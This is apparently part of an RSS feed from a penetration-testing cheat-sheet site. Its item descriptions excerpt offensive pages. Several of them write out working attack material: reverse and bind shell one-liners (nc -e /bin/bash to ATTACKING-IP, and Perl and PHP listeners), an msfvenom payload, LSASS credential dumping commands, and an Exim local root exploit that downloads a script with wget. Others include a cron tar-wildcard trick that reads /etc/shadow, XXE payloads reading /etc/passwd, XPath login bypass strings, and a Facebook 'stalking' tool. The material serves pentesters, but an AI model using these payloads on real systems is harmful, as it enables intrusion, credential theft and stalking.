      <description>Basics - Tips # Get a shell within the container docker ps sudo docker exec -u 0 -it &amp;lt;id_container&amp;gt; bash # Investigating container # --no-trunc option allow to have full output sudo docker history cont/ainer --no-trunc # Getting the container filesystem from the host # Then chmod and extract it # It can be usefull if some files have been deleted sudo docker save cont/ainer -o container.tar </description>
    </item>
    
    <item>
      <title>Facebook</title>
      <link>/open-source-intelligence-osint/platforms-hunting/facebook/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/platforms-hunting/facebook/</guid>
      <description>Tips &amp;amp; Tricks # Stalking and Information Gathering https://stalkscan.com/ # Facebook video downloader https://fbdown.net/ # Find Facebook ID https://findmyfbid.com https://lookup-id.com/ # Facebook tool for multi searches https://whopostedwhat.com/ # You can search for Facebook videos indexed on Google &amp;#34;topic&amp;#34; site:facebok.com!/*/videos # Source + script to do that https://twitter.com/lorenzoromani/status/1301843624230035456?s=19 https://github.com/lorenzoromani1983/facebookTranscripts/blob/master/facebookTranscripts.py # DumpItBlue Extension # Facebook tool box https://le-tools.com/DumpItBlueExtensionDoc.html Facebook Tricks # You can search by e-mail # You can find accounts by e-mail with the recover function https://www.</description>
    </item>
    
    <item>
      <title>ICMP Tricks</title>
      <link>/network/icmp/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/icmp/</guid>
      <description>ICMP exfiltration # Using scapy $ scapy Welcome to Scapy (2.2.0) &amp;gt;&amp;gt;&amp;gt; pkts = rdpcap(&amp;#34;ch6.pcap&amp;#34;) &amp;gt;&amp;gt;&amp;gt; payload_echo_request = [ p[ICMP].load for p in pkts if (p[ICMP].type == 8 and p[ICMP].code == 0)] &amp;gt;&amp;gt;&amp;gt; outfile = open(&amp;#39;ICMP_payload.dump&amp;#39;, &amp;#39;wt&amp;#39;) &amp;gt;&amp;gt;&amp;gt; outfile.write(&amp;#34;&amp;#34;.join(payload_echo_request)) &amp;gt;&amp;gt;&amp;gt; outfile.close() # Using Python #!/usr/bin/python from scapy.all import * import yenc pkts = rdpcap(&amp;#34;./echo_request.pcap&amp;#34;) fichier = open(&amp;#34;./donnees&amp;#34;,&amp;#34;w&amp;#34;) for i in range(0,len(pkts)): fichier.write(pkts[i].load) print yenc.decode(&amp;#34;./donnees&amp;#34;,&amp;#34;./résultat&amp;#34;) ICMP Exfiltration 2 #!/usr/bin/env python from scapy.</description>
    </item>
    
    <item>
      <title>IDOR</title>
      <link>/web-pentest/resources-discovery/idor/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/resources-discovery/idor/</guid>
      <description>IDOR (Insecure Direct Object Reference) # Bypass restrictions using parameter pollution # You can use the same parameter several times api.example/profile?UserId=123 # Ok, your profile api.example/profile?UserId=456 # ERROR api.example/profile?UserId=456&amp;amp;UserId=123 # OK, it can work # Tips # - Some encoded/hashed IDs can be predictable --&amp;gt; Create accounts to see # - Try some id, user_id, message_id even if the application seems to not offer it (on API for ex) # - Parameter Polluttion (HPP) # - Switch between POST and PUT to bypass potential controls # -  </description>
    </item>
    
    <item>
      <title>Impacket</title>
      <link>/windows-systems/exploitation/impacket/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/impacket/</guid>
      <description>Table of Content  General Remote Execution Kerberos Windows Secrets Server Tools / MiTM Attacks WMI Known vulnerabilities SMB/MSRPC MSSQL/TDS File Formats Others  General # Almost every Impacket scripts follows the same option syntaxauthentication:-hashes LMHASH:NTHASHNTLM hashes, format is LMHASH:NTHASH-no-pass don&#39;t ask for password (useful for -k)-k Use Kerberos authentication. Grabs credentials fromccache file (KRB5CCNAME) based on target parameters.If valid credentials cannot be found, it will use theones specified in the command line-aesKey hex key AES key to use for Kerberos Authentication (128 or 256bits)connection:-dc-ip ip address IP Address of the domain controller.</description>
    </item>
    
    <item>
      <title>LSASS, Mimikatz, SAM</title>
      <link>/windows-systems/privilege-escalation/lsass_mimikatz/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/lsass_mimikatz/</guid>
      <description>LSASS # Avoiding running Mimikatz on the target can be a nice solution for stealth # You can just dump the LSASS process, get them and parse it locally procdump.exe -accepteula -ma lsass.exe lsass.dmp # Several dumping methods here - https://kaluche.github.io/posts/2020/09/dumping-credentials-offline/ - https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dump-credentials-from-lsass-process-without-mimikatz - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md # You can use the cmsvcs.dll DLL in order the dump LSASS (https://beta.hackndo.com/remote-lsass-dump-passwords/) # C:\Windows\System32 rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump &amp;lt;lsass pid&amp;gt; lsass.dmp full # Dumping LSASS using the Windows Error Reporting process https://www.</description>
    </item>
    
    <item>
      <title>Magento</title>
      <link>/web-pentest/content-management-system-cms/magento/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/content-management-system-cms/magento/</guid>
      <description>Getting Magento Version # Magento has 2 mains branches, Magento 1 and Magento 2 # On Magento 2, you can add /magento_version targetsite.com/magento_version # On magento 1, you have another login interface at /dowloader # Versions can be displayed in the footer https://www.example.com/downloader/ https://www.example.com/magento/downloader/ # You can find the version by comparing hash file signatures  # between several versions and the running one. # That&amp;#39;s what magescan does. https://github.com/steverobbins/magento-version-identification-php Magescan # Online scanner # Usefull and complete, but online https://magescan.</description>
    </item>
    
    <item>
      <title>nuclei</title>
      <link>/web-pentest/tools/nuclei/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/tools/nuclei/</guid>
      <description>Resources https://nuclei.projectdiscovery.io/ https://github.com/projectdiscovery/nuclei-templates Usage and Examples Targets and settings # Templates nuclei -t exposures/configs/git-config.yaml -l urls.txt nuclei -t cves/2021/ -l urls.txt nuclei -t cves/2020/ -t exposed-tokens -t misconfiguration -l urls.txt # Tags nuclei -tags cve -u urls.txt nuclei -tags config -t exposures/ -u urls.txt nuclei -tags lfi,ssrf,rce -t cves/ -l urls.txt # Workflows nuclei -w workflows/wordpress-workflow.yaml -l wordpress_urls.txt nuclei -w workflows/wordpress-workflow.yaml -w workflows/jira-workflow.yaml -l urls.txt # Severity nuclei -t cves/ -severity critical -l urls.</description>
    </item>
    
    <item>
      <title>Others</title>
      <link>/open-source-intelligence-osint/technical-recon/misc/others/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/technical-recon/misc/others/</guid>
      <description>MISC / Tips # Wget Wizard # Generate wget commands depending what you want https://www.whatismybrowser.com/developers/tools/wget-wizard/ # You can simulate Google Search from other locations using Isearchfrom # It&amp;#39;s useful for searching Google as if you were somewhere else, as well as for SEO &amp;amp; SEA testing. https://isearchfrom.com/ Secrets &amp;amp; Default Passwords # Looking for passwors, API keys etc # Check Online IDES site:http://ideone.com &amp;#34;apikey&amp;#34; site:http://ideone.com &amp;#34;aws_access_key_id&amp;#34; # Default passwords https://www.routerpasswords.com/ https://cirt.</description>
    </item>
    
    <item>
      <title>PHP Type Juggling</title>
      <link>/web-pentest/php-vulnerabilities/type_juggling/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/php-vulnerabilities/type_juggling/</guid>
      <description>Type Juggling and Loose Comparison # Type Juggling # In PHP, “==” returns true if $a equals $b AFTER transtyping &amp;#34;0000&amp;#34; == int(0) -&amp;gt; TRUE &amp;#34;0e12&amp;#34; == int(0) -&amp;gt; TRUE &amp;#34;1abc&amp;#34; == int(1) -&amp;gt; TRUE &amp;#34;0abc&amp;#34; == int(0) -&amp;gt; TRUE &amp;#34;abc&amp;#34; == int(0) -&amp;gt; TRUE # Loose Comparison # In PHP, if “==” is used, then 2 strings beginning by “0e” and filled with numbers will always be equal # It means that you can use magic hashes (0exxxx.</description>
    </item>
    
    <item>
      <title>Reverse Shell</title>
      <link>/shells-methods/reverse/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/shells-methods/reverse/</guid>
      <description>Resources https://alamot.github.io/reverse_shells/ https://github.com/ShutdownRepo/shellerator Table of Content  Basics / Classical Reverse shell using ngrok PHP Windows Linux AWK Python Windows WAR OpenSSL Telnet LUA Ruby Perl  Basics / Classical Reverse shell: nc -nv IP 443 -e /bin/bash ncat --udp IP 443 -e /bin/bash OR /bin/sh | nc ATTACKING-IP 443 OR rm -f /tmp/x; mknod /tmp/x p &amp;amp;&amp;amp; nc &amp;lt;IP&amp;gt; &amp;lt;PORT&amp;gt; 0&amp;lt;/tmp/x | /bin/bash 1&amp;gt;/tmp/x rm -f /tmp/x; mknod /tmp/x p &amp;amp;&amp;amp; /bin/nc.</description>
    </item>
    
    <item>
      <title>Searching Informations</title>
      <link>/windows-systems/post-exploitation-techniques/searching_informations/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/post-exploitation-techniques/searching_informations/</guid>
      <description>Tips # Getting passwords from browser memory procdump.exe -ma firefox_pid strings.exe firefox.dmp | findstr /i &amp;#34;Passwd=&amp;#34; Scavenger # Scavenger is a tool used above CrackMapExec to automate the process # of looking for sensitive files and informations during Internal Pentest python3 ./scavenger.py smb -t 10.0.0.10 -u administrator -p Password123 -d test.local $ python3 ./scavenger.py smb --target iplist --username administrator --password Password123 --domain test.local --overwrite WinSCP # WinSCP is potentially exploitable in the registry if not using a master password # You can manually request the key reg.</description>
    </item>
    
    <item>
      <title>Services</title>
      <link>/linux-systems/privilege-escalation/services/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/linux-systems/privilege-escalation/services/</guid>
      <description>Table of Content  Exim4 MySQL Docker Redis LXD  Exim4 # https://www.exploit-db.com/exploits/39535 #!/bin/sh echo [ CVE-2016-1531 local root exploit cat &amp;gt; /tmp/root.pm &amp;lt;&amp;lt; EOF package root; use strict; use warnings; system(&amp;#34;/bin/sh&amp;#34;); EOF PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps wget http://192.168.0.8:8000/raptor_exim_wiz.sh chmod 777 raptor_exim_wiz.sh ./raptor_exim_wiz.sh -m netcat nc -lvvp 4444 MySQL # If MySQL is running as root, you can run commands sys_exec(&amp;#39;usermod -a -G admin username&amp;#39;) Select sys_exec(&amp;#39;whoami&amp;#39;); select sys_exec(&amp;#39;/bin/bash&amp;#39;); Select sys_eval(&amp;#39;whoami&amp;#39;); # MySQL run as root and version is &amp;lt;5 go for User Defined Functions (UDF) https://www.</description>
    </item>
    
    <item>
      <title>Spiderfoot</title>
      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/spiderfoot/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/spiderfoot/</guid>
      <description>General Informations https://github.com/smicallef/spiderfoot https://www.spiderfoot.net/documentation/ # Query over 100 OSINT sources (IP, domain names, email, names and more) # Select the target, pick modules and spiderfoot will collect and build links # You can identify data leaks, vulnerabilities or sensitive information # Windows and Linux # Needed API Keys : Honeypot Checker, Shodan, VirusTotal, IBM X-Force Exchange # MalwarePatrol, BotScout, Cymon.io, Censys.io, Hunter.io, AlienVault OTX, ClearBit # BuiltWith, FraudGuard, IPinfo.io, CIRCL.LU, SecurityTrails, FullContact.</description>
    </item>
    
    <item>
      <title>SSL Keys extraction</title>
      <link>/cryptography/ssl_keys_extraction/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/cryptography/ssl_keys_extraction/</guid>
      <description>Resources https://github.com/aviat/passe-partout Extraction SSH Agent $ sudo ./passe-partout 4712 Target has pid 4712 on_signal(17 - SIGCHLD) from 4712 [-] invalid DSA key. [-] invalid DSA key. [-] invalid DSA key. [-] invalid DSA key. [X] Valid RSA key found. [X] Key saved to file id_rsa-0.key [-] invalid DSA key. [-] invalid DSA key. [-] invalid DSA key. [-] invalid DSA key. done for pid 4712 OpenSSH_4.3p2 Debian-6, OpenSSL 0.9.8e 23 Feb 2007 debug1: Reading configuration data /dev/null debug1: Connecting to 192.</description>
    </item>
    
    <item>
      <title>Usernames</title>
      <link>/open-source-intelligence-osint/human-recon/username/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/human-recon/username/</guid>
      <description># Username availability https://namechk.com/ # Another service (290 tests) https://whatsmyname.app/ Socialscan (https://github.com/iojw/socialscan) # Many tools used to check if an account exists comes with false positive # 100% accuracy: Rather than scanning profile pages, socialscan queries the  # registration servers of the platforms directly, retrieving the appropriate # CSRF tokens, headers, and cookies.  # This eliminates all false positives/negatives, ensuring that results are accurate. # Speed: socialscan uses asyncio along with aiohttp to conduct all  # queries concurrently, resulting in very quick searching even with bulk queries.</description>
    </item>
    
    <item>
      <title>Web / Bug Bounty</title>
      <link>/resources/web_bug_bounty/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/resources/web_bug_bounty/</guid>
      <description>APIs  API endpoints (https://gist.github.com/yassineaboukir/8e12adefbd505ef704674ad6ad48743d) API Security part 1 (https://medium.com/datadriveninvestor/api-security-testing-part-1-b0fc38228b93) 31 Tips for pentesting APIs (https://medium.com/bugbountywriteup/31-tips-api-security-pentesting-480b5998b765) 31 Tips (drive document) (https://docs.google.com/spreadsheets/d/1jn3JnWzQFZW41gKo5Fhxwf2ke2w-pvrpCGhBmKhyIBE/edit#gid=0) IDOR/BOLA through API (https://medium.com/@inonst/a-deep-dive-on-the-most-critical-api-vulnerability-bola-1342224ec3f2) KeyHacks, show how to use popular APIs (https://github.com/streaak/keyhacks)  Server-Side Injections  SQL Injections filter bypass (https://websec.wordpress.com/tag/sql-filter-bypass/) SQL Injection Cheatsheet (https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md) SSRF SVG Cheatsheet (https://github.com/allanlw/svg-cheatsheet)  Client-Side Injections  HTML5 Security Cheatsheet (https://html5sec.org/) XSS Payloads (https://gbhackers.com/top-500-important-xss-cheat-sheet/) Polyglot XSS (https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot) AwesomeXSS Payloads (https://github.com/s0md3v/AwesomeXSS/)  PHP  PHP Object Injections (https://owasp.</description>
    </item>
    
    <item>
      <title>Web Application Firewall (WAF)</title>
      <link>/web-pentest/applicative-scans/web_application_firewall/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/applicative-scans/web_application_firewall/</guid>
      <description>General Testing - WAFW00F (https://github.com/EnableSecurity/wafw00f) # Simple tool used to identify and fingerprint WAF # Sends a normal HTTP request and analyses the response; this identifies a number of WAF solutions # If that is not successful, it sends a number of (potentially malicious) HTTP requests and uses simple logic to deduce which WAF it is # If that is also not successful, it analyses the responses previously returned and uses another  # simple algorithm to guess if a WAF or security solution is actively responding to our attacks .</description>
    </item>
    
    <item>
      <title>Wordlists &amp; Co</title>
      <link>/passcracking-hashfiles/wordlists/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/passcracking-hashfiles/wordlists/</guid>
      <description>Resources https://github.com/kaonashi-passwords/Kaonashi https://github.com/tarraschk/richelieu https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt https://packetstormsecurity.com/Crackers/wordlists/page4/ http://www.gwicks.net/dictionaries.htm # SCADA Default Passwords http://www.critifence.com/default-password-database/ https://weakpass.com/ https://github.com/berzerk0/Probable-Wordlists # Looks very cool wordlists https://github.com/FlameOfIgnis/Pwdb-Public CeWL # CeWL allows you to build custom wordlists based on online resources # If you know that your target is target.com, you can parse web content to build lists # Can be time consuming # 5 levels of depth and minimum 7 char per word cewl -w customwordlist.txt -d 5 -m 7 www.</description>
    </item>
    
    <item>
      <title>XML External Entity (XXE) and XSLT</title>
      <link>/web-pentest/files-and-files-inclusions/xxe/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/files-and-files-inclusions/xxe/</guid>
      <description>Resources https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf Basic XXE &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;ISO-8859-1&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;php://filter/read=convert.base64-encode/resource=path/index.php&amp;#34; &amp;gt; ]&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34; &amp;gt; ]&amp;gt;&amp;lt;title&amp;gt;&amp;amp;xxe;&amp;lt;/title&amp;gt; # XXE via Word: &amp;lt;!-- word/document.xml --&amp;gt; &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34; standalone=&amp;#34;yes&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [ &amp;lt;!ENTITY % pe SYSTEM &amp;#34;nc -nlvp 31337&amp;#34;&amp;gt; %pe; ]&amp;gt; &amp;lt;foo&amp;gt;&amp;amp;external;&amp;lt;/foo&amp;gt; &amp;lt;!-- word/document.xml --&amp;gt; &amp;lt;!DOCTYPE r [ &amp;lt;!ELEMENT r ANY &amp;gt; &amp;lt;!ENTITY sp SYSTEM &amp;#34;nc -nlvp 31337&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;r&amp;gt;&amp;amp;sp;&amp;lt;/r&amp;gt; Out of Band XXE (OOB XXE) # The exploitation will download a remote DTD file # And then execute entities # SVG File &amp;lt;!</description>
    </item>
    
    <item>
      <title>XPath Injections</title>
      <link>/web-pentest/injections/server-side-injections/xpath/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/injections/server-side-injections/xpath/</guid>
      <description>Basic authentication bypass # XPath login/password often works as follow # $xpath = &amp;quot;//user[user=&#39;&amp;quot; . $_GET[&#39;user&#39;] . &amp;quot;&#39; and pass=&#39;&amp;quot; . $_GET[&#39;pass&#39;] . &amp;quot;&#39;]&amp;quot;; # You can make the 2 conds TRUE and log with the first user user=&#39; or &#39;1&#39;=&#39;1&amp;amp;pass=&#39; or &#39;1&#39;=&#39;1 # Log using a specific user //user[username=&#39;&#39; or &#39;1&#39;=&#39;1&#39; and password=&#39;truc&#39;] ⇒ John&#39; or &#39;1&#39;=&#39;1 # Bypass the password (because of the ‘=’) &#39; or username=&#39;John&#39; or &#39;&#39;=&#39; String XPath Injection # You can use following: to display all the following attributes after the node a&#39;)]/following::*[(&#39;1&#39;=&#39;1 # You can inject in the contains() # Just bypass the first condition to get out of //user/username and then display the whole user content search=&#39;)] | //user/*[contains(*,&#39; # You can just escape username to request password field search=Har&#39;)%20and%20contains(.</description>
    </item>
    
    <item>
      <title>80/443 - HTTP/HTTPS</title>
      <link>/network/services-enumeration/80_443_https/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/network/services-enumeration/80_443_https/</guid>
      <description>Identification and Checks # IIS nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-iis-webdav-vuln &amp;lt;IP&amp;gt; # JBOSS (CVE-2010-0738) nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-vuln-cve2010-0738 &amp;lt;IP&amp;gt; # PHP-CGI (CVE-2012-1823) nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-vuln-cve2012-1823 &amp;lt;IP&amp;gt; # RCE Ruby on Rails (CVE-2013-0156) nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-vuln-cve2013-0156 &amp;lt;IP&amp;gt; # WAF Detection nmap -Pn -n -T3 -v -sV --version-intensity=5 -Pn -p 80 --script=http-waf-detect,http-waf-fingerprint &amp;lt;IP&amp;gt; # Check Heartbleed CVE-2014-0160 nmap -Pn -n -p 443 -v -T3 --script=ssl-heartbleed,ssl-enum-ciphers,ssl-known-key --script-args vulns.</description>
    </item>
    
    <item>
      <title>Admin and Processes</title>
      <link>/windows-systems/privilege-escalation/admin_processes/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/privilege-escalation/admin_processes/</guid>
      <description>Local Processes # Check local processes net group “Domain Admins” /domain # The account running the process should be in 7th column: tasklist /v # Then compare the 2 results Sessions # Query DC to check about domain active sessions: net group “Domain Controllers” /domain (build dcs.txt with it) nslookup –type=SRV _ldap._tcp. net group “Domain Admins” /domain (build admins.txt with it) netsess.exe netsess.exe servername netsess.exe servername /full (admin required) FOR /F %i in (dcs.</description>
    </item>
    
    <item>
      <title>Amazon Web Services (AWS)</title>
      <link>/other-systems/amazon_web_services/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/other-systems/amazon_web_services/</guid>
      <description>https://github.com/toniblyx/my-arsenal-of-aws-security-tools https://github.com/RhinoSecurityLabs/ccat https://github.com/RhinoSecurityLabs/pacu https://github.com/carnal0wnage/weirdAAL https://github.com/Static-Flow/CloudCopy # Cheatsheet https://www.magnussen.funcmylife.fr/article_35 GitLeaks (https://github.com/zricethezav/gitleaks) # Audit git repos for secrets keys ./gitleaks --repo=xxxxx --verbose --pretty Enumerate IAM (https://github.com/andresriancho/enumerate-iam) # Enumerate the permissions associated with AWS credential set  ./enumerate-iam.py --access-key AKIA... --secret-key StF0q... # enumerate-iam.py tries to brute force all API calls allowed by the IAM policy. # The calls performed by this tool are all non-destructive (only get* and list* calls are performed). SQLmap proxy for AWS https://github.</description>
    </item>
    
    <item>
      <title>Bind Shell</title>
      <link>/shells-methods/bind/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/shells-methods/bind/</guid>
      <description>Listener # Linux nc -nlvp 51337 -e /bin/bash # OpenBSD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&amp;gt;&amp;amp;1|nc -lvp 51337 &amp;gt;/tmp/f Windows msfvenom -p windows/shell_bind_tcp -b “\x00\x0a\x0d” LHOST=IP LPORT=1337 -f asp &amp;gt; acknak_TCP_RS.asp https://github.com/besimorhino/powercat # Victim (listen) . .\powercat.ps1 powercat -l -p 7002 -ep # Connect from attacker . .\powercat.ps1 powercat -c 127.0.0.1 -p 7002 Perl perl -e &amp;#39;use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));\ bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\ close C){open(STDIN,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);exec(&amp;#34;/bin/bash -i&amp;#34;);};&amp;#39; PHP php -r &amp;#39;$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,&amp;#34;0.0.0.0&amp;#34;,51337);\ socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,&amp;#34;$ &amp;#34;,2))exit;\ $in=socket_read($cl,100);$cmd=popen(&amp;#34;$in&amp;#34;,&amp;#34;r&amp;#34;);while(!feof($cmd)){$m=fgetc($cmd);\ socket_write($cl,$m,strlen($m));}}&amp;#39; Ruby ruby -rsocket -e &amp;#39;f=TCPServer.</description>
    </item>
    
    <item>
      <title>CMSMap</title>
      <link>/web-pentest/content-management-system-cms/cmsmap/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/content-management-system-cms/cmsmap/</guid>
      <description>Intro # CMSmap is a python open source CMS scanner that automates the process  # of detecting security flaws of the most popular CMSs.  # The main purpose of CMSmap is to integrate common vulnerabilities for  # different types of CMSs in a single tool. # At the moment, CMSs supported by CMSmap are WordPress, Joomla, Drupal and Moodle. Usage usage: cmsmap [-f W/J/D] [-F] [-t] [-a] [-H] [-i] [-o] [-E] [-d] [-u] [-p] [-x] [-k] [-w] [-v] [-h] [-D] [-U W/J/D] [target] CMSmap tool v1.</description>
    </item>
    
    <item>
      <title>Crontab</title>
      <link>/linux-systems/privilege-escalation/crontab/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/linux-systems/privilege-escalation/crontab/</guid>
      <description>Tar wildcard + root cron # If a privilegied script is used to backup something or just uses tar * in a folder you have write access # You can exploit it to gain root access # Create 3 files in the folder touch -- &amp;#34;--checkpoint=1&amp;#34; touch -- “--checkpoint-action=exec=sh\ shell.sh” touch shell.sh # Then put your payload in the shell.sh script (#!/bin/sh) cat /etc/shadow &amp;gt; outfile.txt Exploiting crontab # If a script is running with higher privileges echo &amp;#34;cat /challenge/app-script/ch4/.</description>
    </item>
    
    <item>
      <title>Cyber Threat Intel</title>
      <link>/resources/cti/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/resources/cti/</guid>
      <description>Some CTI Resources  Threat Actor Map (https://aptmap.netlify.app/#) Darknet Markets For Investigators (https://www.osintme.com/index.php/2020/11/21/list-of-darknet-markets-for-investigators/) Analyzing Network Infrastructure as Composite Objects (https://www.domaintools.com/resources/blog/analyzing-network-infrastructure-as-composite-objects/) Extrapolating Adversary Intent Through Infrastructure (https://www.domaintools.com/resources/blog/extrapolating-adversary-intent-through-infrastructure/) Current Events to Widespread Campaigns: Pivoting from Samples to Identify Activity (https://www.domaintools.com/resources/blog/current-events-to-widespread-campaigns-pivoting-from-samples-to-identify/)  Not really CTI Related but can help  Le Dessous des Cartes (Geopolitics) (https://www.youtube.com/c/LeDessousdesCartesARTE/videos)  Training and learning  A Cyber Threat Intelligence Self-Study Plan: Part 1 (https://medium.com/katies-five-cents/a-cyber-threat-intelligence-self-study-plan-part-1-968b5a8daf9a)   Tools and Usable informations  Certstream project (https://certstream.</description>
    </item>
    
    <item>
      <title>Datasploit</title>
      <link>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/datasploit/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/tools-and-methodology/frameworks-automated/datasploit/</guid>
      <description>General Informations # Performs automated OSINT on a domain / email / username / IP and find out relevant information from different sources. # Easy to contribute OSINT Framework. # Code for Banner, Main and Output function. Datasploit automagically do rest of the things for you. # Useful for Pen-testers, Bug Bounty Hunters, Cyber Investigators, Product companies, Security Engineers, etc. # Collaborate the results, show them in a consolidated manner. # Tries to find out credentials, api-keys, tokens, subdomains, domain history, legacy portals, usernames, dumped accounts, etc.</description>
    </item>
    
    <item>
      <title>HTTP Request Smuggling</title>
      <link>/web-pentest/resources-discovery/http_request_smuggling/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/web-pentest/resources-discovery/http_request_smuggling/</guid>
      <description>HTTP Request Smuggling https://portswigger.net/web-security/request-smuggling # Smuggler.py is a small tool used to test that python smuggler.py -h _ ___ _ __ ___ _ _ __ _ __ _| | ___ _ __ _ __ _ _ / __| &amp;#39;_ ` _ \| | | |/ _` |/ _` | |/ _ \ &amp;#39;__| | &amp;#39;_ \| | | | \__ \ | | | | | |_| | (_| | (_| | | __/ | _ | |_) | |_| | |___/_| |_| |_|\__,_|\__, |\__, |_|\___|_| (_) | .</description>
    </item>
    
    <item>
      <title>Instagram</title>
      <link>/open-source-intelligence-osint/platforms-hunting/instagram/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/open-source-intelligence-osint/platforms-hunting/instagram/</guid>
      <description>Tips &amp;amp; Tricks Instagram ID # Instagram User ID can be very important to investigate # Each account has a unique user ID linked to the @username # Some websites allows to get it for an account https://codeofaninja.com/tools/find-instagram-user-id # You can then trace and spot re-used instagram account by # searching for old names and post, for example using # Google Dorks Mirrors # Instagram Mirrors can be usefull to browse Instagram accounts # Search features are less restrictive # Some deleted content can still be indexed https://rankersta.</description>
    </item>
    
    <item>
      <title>Kerberos</title>
      <link>/windows-systems/exploitation/kerberos/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>/windows-systems/exploitation/kerberos/</guid>
      <description>Cheatsheet : https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a KRB5CONF : https://gist.github.com/kaluche/ba69e701624c2e44e3d1f60c5370cebe
